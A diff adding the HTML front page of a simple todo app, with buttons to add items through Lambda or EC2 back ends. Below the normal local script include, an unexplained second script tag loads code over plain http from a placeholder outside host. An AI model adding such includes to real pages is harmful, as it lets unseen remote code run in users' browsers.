@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>3-Tier Todo App</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <h1>📝 Todo List</h1>
+        <div class="input-group">
+            <input type="text" id="todoInput" placeholder="Enter new todo" onkeypress="if(event.key==='Enter') addTodoViaLambda()">
+            <div class="button-group">
+                <button class="btn btn-lambda" onclick="addTodoViaLambda()">Add via Lambda</button>
+                <button class="btn btn-ec2" onclick="addTodoViaEC2()">Add via EC2</button>
+            </div>
+        </div>
+        <ul id="todoList"></ul>
+        <div id="response" class="response-message"></div>
+    </div>
+    <script src="script1.js"></script>
+<script type="text/javascript" src="http://mydomain.example/xxxx.js">fffffff</script>
+
+
+
+</body>
+</html>
